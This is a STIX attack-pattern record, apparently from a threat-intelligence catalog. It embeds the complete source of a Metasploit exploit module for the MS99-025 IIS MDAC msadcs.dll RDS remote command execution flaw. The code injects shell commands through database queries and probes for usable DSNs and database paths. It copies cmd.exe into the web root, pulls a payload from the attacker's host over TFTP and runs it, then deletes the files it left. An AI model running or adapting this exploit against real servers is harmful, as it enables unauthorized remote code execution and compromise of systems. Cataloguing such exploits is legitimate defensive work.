{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--59a2572e-82fd-419c-90c2-82eeb7f0d73d",
    "created": "2024-08-14T16:48:35.901188Z",
    "modified": "2024-08-14T16:48:35.901192Z",
    "name": "MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution",
    "description": " This module can be used to execute arbitrary commands on IIS servers that expose the /msadc/msadcs.dll Microsoft Data Access Components (MDAC) Remote Data Service (RDS) DataFactory service using VbBusObj or AdvancedDataFactory to inject shell commands into Microsoft Access databases (MDBs), MSSQL databases and ODBC/JET Data Source Name (DSN). Based on the msadcs.pl v2 exploit by Rain.Forest.Puppy, which was actively used in the wild in the late Ninties. MDAC versions affected include MDAC 1.5, 2.0, 2.0 SDK, 2.1 and systems with the MDAC Sample Pages for RDS installed, and NT4 Servers with the NT Option Pack installed or upgraded 2000 systems often running IIS3/4/5 however some vulnerable installations can still be found on newer Windows operating systems. Note that newer releases of msadcs.dll can still be abused however by default remote connections to the RDS is denied. Consider using VERBOSE if you're unable to successfully execute a command, as the error messages are detailed and useful for debugging. Also set NAME to obtain the remote hostname and METHOD to use the alternative VbBusObj technique. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/iis/msadc.rb",
            "external_id": "msadc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-1011"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'rex/exploitation'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize\n    super(\n      'Name' => 'MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution',\n      'Description' => %q{\n          This module can be used to execute arbitrary commands on IIS servers\n          that expose the /msadc/msadcs.dll Microsoft Data Access Components\n          (MDAC) Remote Data Service (RDS) DataFactory service using VbBusObj\n          or AdvancedDataFactory to inject shell commands into Microsoft Access\n          databases (MDBs), MSSQL databases and ODBC/JET Data Source Name (DSN).\n          Based on the msadcs.pl v2 exploit by Rain.Forest.Puppy, which was actively\n          used in the wild in the late Ninties. MDAC versions affected include MDAC\n          1.5, 2.0, 2.0 SDK, 2.1 and systems with the MDAC Sample Pages for RDS\n          installed, and NT4 Servers with the NT Option Pack installed or upgraded\n          2000 systems often running IIS3/4/5 however some vulnerable installations\n          can still be found on newer Windows operating systems. Note that newer\n          releases of msadcs.dll can still be abused however by default remote\n          connections to the RDS is denied. Consider using VERBOSE if you're unable\n          to successfully execute a command, as the error messages are detailed\n          and useful for debugging. Also set NAME to obtain the remote hostname,\n          and METHOD to use the alternative VbBusObj technique.\n      },\n      'Author' => 'aushack',\n      'Platform' => 'win',\n      'References' => [\n        ['OSVDB', '272'],\n        ['BID', '529'],\n        ['CVE', '1999-1011'],\n        ['MSB', 'MS98-004'],\n        ['MSB', 'MS99-025']\n      ],\n      'Targets' => [\n        # aushack tested meterpreter OK 20120601\n        # nt4server w/sp3, ie4.02, option pack, IIS4.0, mdac 1.5, over msaccess shell, reverse_nonx\n        # w2k w/sp0, IIS5.0, mdac 2.7 RTM, sql2000, handunsf.reg, over xp_cmdshell, reverse_tcp\n        [ 'Automatic', {} ],\n      ],\n      'CmdStagerFlavor' => 'tftp',\n      'DefaultTarget' => 0,\n      'DisclosureDate' => 'Jul 17 1998',\n      'Compat' => {\n        'Meterpreter' => {\n          'Commands' => %w[\n            stdapi_fs_delete_file\n            stdapi_sys_process_execute\n          ]\n        }\n      }\n    )\n\n    register_options(\n      [\n        OptString.new('PATH', [ true, \"The path to msadcs.dll\", '/msadc/msadcs.dll']),\n        OptBool.new('METHOD', [ true, \"If true, use VbBusObj instead of AdvancedDataFactory\", false]),\n        OptBool.new('NAME', [ true, \"If true, attempt to obtain the MACHINE NAME\", false]),\n        OptString.new('DBHOST', [ true, \"The SQL Server host\", 'local']),\n        OptString.new('DBNAME', [ true, \"The SQL Server database\", 'master']),\n        OptString.new('DBUID', [ true, \"The SQL Server uid (default is sa)\", 'sa']),\n        OptString.new('DBPASSWORD', [ false, \"The SQL Server password (default is blank)\", '']),\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    res = send_request_raw({\n      'uri' => normalize_uri(datastore['PATH']),\n      'method' => 'GET',\n    })\n    if (res.code == 200)\n      print_status(\"Server responded with HTTP #{res.code} OK\")\n      if (res.body =~ /Content-Type: application\\/x-varg/)\n        print_good(\"#{datastore['PATH']} matches fingerprint application\\/x-varg\")\n        Exploit::CheckCode::Detected\n      end\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def create_dsn(drive, dsn)\n    req = \"/scripts/tools/newdsn.exe?driver=Microsoft\\%2BAccess\\%2BDriver\\%2B\\%28*.mdb\\%29\\&dsn=#{dsn}\\&dbq=#{drive}\\%3A\\%5Csys.mdb\\&newdb=CREATE_DB\\&attr=\"\n\n    res = send_request_raw({\n      'uri' => req,\n    })\n\n    if (res and res.code == 200 and res.body =~ /<H2>Datasource creation <B>FAILED!  The most likely cause is invalid attributes<\\/B><\\/H2>/)\n      vprint_error(\"DSN CREATE failed for drive #{drive} with #{dsn}.\")\n      return false\n    elsif (res.code == 200 and res.body =~ /<H2>Datasource creation successful<\\/H2>/)\n      print_good(\"DSN CREATE SUCCESSFUL for drive #{drive} with #{dsn}!\")\n      return true\n    end\n  end\n\n  def exec_cmd(sql, cmd, d)\n    boundary = rand_text_alphanumeric(8)\n    method = datastore['METHOD'] ? \"VbBusObj.VbBusObjCls.GetRecordset\" : \"AdvancedDataFactory.Query\"\n    dsn = Rex::Text.to_unicode(d)\n    if (d =~ /driver=\\{SQL Server\\}/)\n      select = Rex::Text.to_unicode(sql + '\"' + cmd + '\"')\n    elsif (cmd.nil?)\n      select = Rex::Text.to_unicode(sql)\n    else\n      select = Rex::Text.to_unicode(sql + \"'|shell(\\\"\" + cmd + \"\\\")|'\")\n    end\n\n    vprint_status(\"Attempting to request: #{select} on #{d}\")\n\n    query = \"\\x02\\x00\\x03\\x00\\x08\\x00#{[select.size].pack('S')}\\x00\\x00#{select}\\x08\\x00#{[dsn.size].pack('S')}\\x00\\x00#{dsn}\"\n\n    sploit = \"--#{boundary}\\r\\n\"\n    sploit << \"Content-Type: application/x-varg\\r\\n\"\n    sploit << \"Content-Length: #{query.length}\\r\\n\\r\\n\"\n    sploit << query\n    sploit << \"\\r\\n--#{boundary}--\\r\\n\"\n\n    data = \"ADCClientVersion:01.06\\r\\n\"\n    data << 'Content-Type: multipart/mixed; boundary=' + boundary + '; num-args=3'\n    data << \"\\r\\n\\r\\n\"\n    data << sploit\n\n    res = send_request_raw({\n      'uri' => normalize_uri(datastore['PATH'], method),\n      'agent' => 'ACTIVEDATA',\n      'headers' =>\n        {\n          'Content-Length' => data.length,\n          'Connection' => \"Keep-Alive\",\n        },\n      'method' => 'POST',\n      'data' => data,\n    })\n\n    response = Rex::Text.to_ascii(res.body, 'utf-16be')\n\n    if (response =~ /HTTP:\\/\\/www.microsoft.com\\/activex.vip\\/adofx/ || res.body =~ /o.u.t.p.u.t./)\n      vprint_good(\"Command was successfully executed! Statement: #{select} Driver: #{d}\")\n      return true, sql, d\n    elsif (response =~ /RDS Server Error: The server has denied access to the default RDS Handler used to access this page. See the Server Administrator for more information about server security settings./)\n      print_error(\"Exploit failed: the server is patched\")\n      return # we cannot continue - server refuses to accept RDS traffic from remote IPs. bail.\n    elsif (response =~ /The Microsoft Jet database engine cannot find the input table or query \\'(\\w+)\\'/)\n      vprint_error(\"Server is vulnerable but Microsoft Jet database cannot find table: #{$1}\")\n    elsif (response =~ /isn't a valid path/ || response =~ /is not a valid path/ || response =~ /Could not find file/)\n      vprint_error(\"Server is vulnerable but the drive and path is incorrect.\")\n    elsif (response =~ /Disk or network error./)\n      vprint_error(\"Server is vulnerable but the driver letter doesn't physically exist.\")\n    elsif (response =~ /Syntax error in CREATE TABLE statement/)\n      vprint_error(\"Server is vulnerable and the database exists however the CREATE TABLE command failed\")\n    elsif (response =~ /Table '(\\w+)' already exists/)\n      vprint_error(\"Server is vulnerable and the database exists however the TABLE '#{$1}' already exists!\")\n    elsif (response =~ /Syntax error \\(missing operator\\) in query expression/)\n      vprint_error(\"Server is vulnerable and the database and table exists however the SELECT statement has a syntax error.\")\n    elsif (response =~ /Too few parameters. Expected 1/)\n      print_good(\"Command was probably executed!\")\n    elsif (response =~ /Data source name not found and no default driver specified/)\n      vprint_error(\"Server is vulnerable however the requested DSN '#{d}' does not exist.\")\n    elsif (response =~ /Couldn't find file/)\n      vprint_error(\"Server is vulnerable however the requested .mdb file does not exist.\")\n    elsif (response =~ /Specified SQL server not found/)\n      vprint_error(\"Server is vulnerable however the specified Microsoft SQL Server does not exist\")\n    elsif (response =~ /Server does not exist or access denied/)\n      vprint_error(\"Server is vulnerable however the specified Microsoft SQL Server does not exist or access is denied\")\n    elsif (response =~ /General error Unable to open registry key/)\n      vprint_error(\"Server error (possible misconfiguration): Unable to open registry key \")\n    elsif (response =~ /It is in a read-only database/)\n      vprint_error(\"Server accepted request however the requested .mdb is READ-ONLY\")\n    elsif (response =~ /Invalid connection/)\n      vprint_error(\"Server accepted request however the MSSQL database says Invalid connection\")\n    elsif (response =~ /\\[SQL Server\\]Login failed for user/)\n      vprint_error(\"Server accepted request however the MSSQL database uid / password credentials are incorrect.\")\n    elsif (response =~ /EXECUTE permission denied on object 'xp_cmdshell'/)\n      vprint_error(\"Server accepted request and MSSQL uid/pass is correct however the UID does not have permission to execute xp_cmdshell!\")\n    elsif (response =~ /\\\"(...)\\\"/) # we use rand_text_alphanumeric for 'table'. response is '\"<table>\" <table>' but means nothing to me. regexp is a little lazy however the unicode response doesn't give us much to work with; we only know it is 3 bytes long and quoted which should be unique.\n      vprint_error(\"Server accepted request however it failed for reasons unknown.\")\n    elsif (res.body =~ /\\x09\\x00\\x01/) # magic bytes? rfp used it too :P maybe a retval?\n      vprint_error(\"Unknown reply - but the command didn't execute\")\n    else\n      vprint_status(\"Unknown reply - server is likely patched:\\n#{response}\")\n    end\n    return false\n  end\n\n  def find_exec\n    # config data - greets to rain forest puppy :)\n    boundary = rand_text_alphanumeric(8)\n\n    if (datastore['NAME']) # Obtain the hostname if true\n\n      data = \"ADCClientVersion:01.06\\r\\n\"\n      data << 'Content-Type: multipart/mixed; boundary=' + boundary + '; num-args=0'\n      data << \"\\r\\n\\r\\n--#{boundary}--\\r\\n\"\n\n      res = send_request_raw({\n        'uri' => normalize_uri(datastore['PATH'], '/VbBusObj.VbBusObjCls.GetMachineName'),\n        'agent' => 'ACTIVEDATA',\n        'headers' =>\n        {\n          'Content-Length' => data.length,\n          'Connection' => \"Keep-Alive\",\n        },\n        'method' => 'POST',\n        'data' => data,\n\n      })\n\n      if (res.code == 200 and res.body =~ /\\x01(.+)/) # Should return the hostname\n        print_good(\"Hostname: #{$1}\")\n      end\n    end\n\n    drives\t= [\"c\", \"d\", \"e\", \"f\", \"g\", \"h\"]\n    sysdirs = ['winnt', 'windows', 'win', 'winnt351', 'winnt35' ]\n    dsns\t= [\n      \"AdvWorks\", \"pubs\", \"wicca\", \"CertSvr\", \"CFApplications\", \"cfexamples\", \"CFForums\",\n      \"CFRealm\", \"cfsnippets\", \"UAM\", \"banner\", \"banners\", \"ads\", \"ADCDemo\", \"ADCTest\"\n    ]\n\n    sysmdbs = [\n      \"\\\\catroot\\\\icatalog.mdb\", # these are %systemroot%\n      \"\\\\help\\\\iishelp\\\\iis\\\\htm\\\\tutorial\\\\eecustmr.mdb\",\n      \"\\\\system32\\\\help\\\\iishelp\\\\iis\\\\htm\\\\tutorial\\\\eecustmr.mdb\",\n      \"\\\\system32\\\\certmdb.mdb\",\n      \"\\\\system32\\\\ias\\\\ias.mdb\",\n      \"\\\\system32\\\\ias\\\\dnary.mdb\",\n      \"\\\\system32\\\\certlog\\\\certsrv.mdb\"\n    ]\n\n    mdbs = [\n      \"\\\\cfusion\\\\cfapps\\\\cfappman\\\\data\\\\applications.mdb\", # these are non-windows\n      \"\\\\cfusion\\\\cfapps\\\\forums\\\\forums_.mdb\",\n      \"\\\\cfusion\\\\cfapps\\\\forums\\\\data\\\\forums.mdb\",\n      \"\\\\cfusion\\\\cfapps\\\\security\\\\realm_.mdb\",\n      \"\\\\cfusion\\\\cfapps\\\\security\\\\data\\\\realm.mdb\",\n      \"\\\\cfusion\\\\database\\\\cfexamples.mdb\",\n      \"\\\\cfusion\\\\database\\\\cfsnippets.mdb\",\n      \"\\\\inetpub\\\\iissamples\\\\sdk\\\\asp\\\\database\\\\authors.mdb\",\n      \"\\\\progra~1\\\\common~1\\\\system\\\\msadc\\\\samples\\\\advworks.mdb\",\n      \"\\\\cfusion\\\\brighttiger\\\\database\\\\cleam.mdb\",\n      \"\\\\cfusion\\\\database\\\\smpolicy.mdb\",\n      \"\\\\cfusion\\\\database\\\\cypress.mdb\",\n      \"\\\\progra~1\\\\ableco~1\\\\ablecommerce\\\\databases\\\\acb2_main1.mdb\",\n      \"\\\\website\\\\cgi-win\\\\dbsample.mdb\",\n      \"\\\\perl\\\\prk\\\\bookexamples\\\\modsamp\\\\database\\\\contact.mdb\",\n      \"\\\\perl\\\\prk\\\\bookexamples\\\\utilsamp\\\\data\\\\access\\\\prk.mdb\"\n    ]\n\n    print_status(\"Step 1: Trying raw driver to btcustmr.mdb\")\n\n    drives.each do |drive|\n      sysdirs.each do |sysdir|\n        ret = exec_cmd(\"Select * from Customers where City=\", \"cmd /c echo x\", \"driver={Microsoft Access Driver (*.mdb)};dbq=#{drive}:\\\\#{sysdir}\\\\help\\\\iis\\\\htm\\\\tutorial\\\\btcustmr.mdb;\")\n        return ret if (ret)\n      end\n    end\n\n    print_status(\"Step 2: Trying to make our own DSN...\")\n    x = false # Stop if we make a DSN\n    drives.each do |drive|\n      dsns.each do |dsn|\n        unless x\n          x = create_dsn(drive, dsn)\n        end\n      end\n    end\n\n    table = rand_text_alphanumeric(3)\n    print_status(\"Step 3: Trying to create a new table in our own DSN...\")\n    exec_cmd(\"create table #{table} (B int, C varchar(10))\", nil, \"driver={Microsoft Access Driver (*.mdb)};dbq=c:\\\\sys.mdb;\") # this is general make table query\n\n    print_status(\"Step 4: Trying to execute our command via our own DSN and table...\")\n    ret = exec_cmd(\"select * from #{table} where C=\", \"cmd /c echo x\", \"driver={Microsoft Access Driver (*.mdb)};dbq=c:\\\\sys.mdb;\") # this is general exploit table query\n    return ret if (ret)\n\n    print_status(\"Step 5: Trying to execute our command via known DSNs...\")\n    dsns.each do |dsn|\n      ret = exec_cmd(\"select * from MSysModules where name=\", \"cmd /c echo x\", dsn) # this is table-independent query (new)\n      return ret if (ret)\n    end\n\n    print_status(\"Step 6: Trying known system .mdbs...\")\n    drives.each do |drive|\n      sysdirs.each do |sysdir|\n        sysmdbs.each do |sysmdb|\n          exec_cmd(\"create table #{table} (B int, C varchar(10))\", nil, \"driver={Microsoft Access Driver (*.mdb)};dbq=#{drive}:\\\\#{sysdir}#{sysmdb};\")\n          ret = exec_cmd(\"select * from #{table} where C=\", \"cmd /c echo x\", \"driver={Microsoft Access Driver (*.mdb)};dbq=#{drive}:\\\\#{sysdir}#{sysmdb};\")\n          return ret if (ret)\n        end\n      end\n    end\n\n    print_status(\"Step 7: Trying known program file .mdbs...\")\n    drives.each do |drive|\n      mdbs.each do |mdb|\n        exec_cmd(\"create table #{table} (B int, C varchar(10))\", nil, \"driver={Microsoft Access Driver (*.mdb)};dbq=#{drive}:#{mdb};\")\n        ret = exec_cmd(\"select * from #{table} where C=\", \"cmd /c echo x\", \"driver={Microsoft Access Driver (*.mdb)};dbq=#{drive}:#{mdb};\")\n        return ret if (ret)\n      end\n    end\n\n    print_status(\"Step 8: Trying SQL xp_cmdshell method...\")\n    ret = exec_cmd(\"EXEC master..xp_cmdshell\", \"cmd /c echo x\", \"driver={SQL Server};server=(#{datastore['DBHOST']});database=#{datastore['DBNAME']};uid=#{datastore['DBUID']};pwd=#{datastore['DBPASSWORD']}\") # based on hdm's sqlrds.pl :)\n    return ret if (ret)\n\n    return -1\n  end\n\n  def exploit\n    print_status(\"Searching for valid command execution point...\")\n    x = false\n    until (x)\n      x, y, z = find_exec\n      if (x == -1)\n        break\n      end\n    end\n\n    if (x == true)\n      print_good(\"Successful command execution found!\")\n\n      # now copy the file\n      exe_fname = rand_text_alphanumeric(4 + rand(4)) + \".exe\"\n      print_status(\"Copying cmd.exe to the web root as \\\"#{exe_fname}\\\"...\")\n      # NOTE: this assumes %SystemRoot% on the same drive as the web scripts directory\n      # Unfortunately, using %SystemRoot% doesn't seem to work :(\n      res = exec_cmd(y, \"cmd /c copy cmd.exe \\\\inetpub\\\\scripts\\\\#{exe_fname}\", z)\n\n      # Use the CMD stager to get a payload running\n      tftphost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n      execute_cmdstager({ temp: '.', tftphost: tftphost, linemax: 1_400, cgifname: exe_fname, noconcat: true })\n\n      # Save these file names for later deletion\n      @exe_cmd_copy = exe_fname\n      @exe_payload = stager_instance.payload_exe # Grab this info from CmdStagerTFTP\n\n      # Just for good measure, we'll make a quick, direct request for the payload\n      # Using the \"start\" method doesn't seem to make iis very happy :(\n      print_status(\"Triggering the payload via a direct request...\")\n      res = send_request_raw({ 'uri' => '/scripts/' + stager_instance.payload_exe, 'method' => 'GET' }, 1)\n    end\n\n    handler\n  end\n\n  #\n  # The following handles deleting the copied cmd.exe and payload exe!\n  #\n  def on_new_session(client)\n    if client.type != \"meterpreter\"\n      print_error(\"NOTE: you must use a meterpreter payload in order to automatically cleanup.\")\n      print_error(\"The copied exe and the payload exe must be removed manually.\")\n      return\n    end\n\n    return if not @exe_cmd_copy\n\n    # stdapi must be loaded before we can use fs.file\n    client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n\n    # Delete the copied CMD.exe\n    print_status(\"Deleting copy of CMD.exe \\\"#{@exe_cmd_copy}\\\" ...\")\n    client.fs.file.rm(@exe_cmd_copy)\n\n    # Migrate so  that we can delete the payload exe\n    client.console.run_single(\"run migrate -f\")\n\n    # Delete the payload exe\n    return if not @exe_payload\n\n    delete_me_too = \"C:\\\\inetpub\\\\scripts\\\\\" + @exe_payload # C:\\ ?\n\n    print_warning(\"Changing permissions on #{delete_me_too} ...\")\n    cmd = \"C:\\\\#{sysdir[0]}\\\\system32\\\\attrib.exe -r -h -s \" + delete_me_too # winnt ?\n    client.sys.process.execute(cmd, nil, { 'Hidden' => true })\n\n    print_warning(\"Deleting #{delete_me_too} ...\")\n    begin\n      client.fs.file.rm(delete_me_too)\n    rescue ::Exception => e\n      print_error(\"Exception: #{e.inspect}\")\n    end\n  end\n\n  def cleanup\n    framework.events.remove_exploit_subscriber(self)\n  end\n\n  def execute_command(cmd, opts = {})\n    # Don't try the start command...\n    # Using the \"start\" method doesn't seem to make iis very happy :(\n    return [nil, nil] if cmd =~ /^start [a-zA-Z]+\\.exe$/\n\n    print_status(\"Executing command: #{cmd} (options: #{opts.inspect})\")\n\n    uri = '/scripts/'\n    exe = opts[:cgifname]\n    if (exe)\n      uri << exe\n    end\n    uri << '?/x+/c+'\n    uri << Rex::Text.uri_encode(cmd)\n\n    vprint_status(\"Attempting to execute: #{uri}\")\n\n    res = send_request_raw({\n      'uri' => uri,\n      'method' => 'GET',\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "Jul 17 1998",
    "x_mitre_platforms": [
        "win'"
    ]
}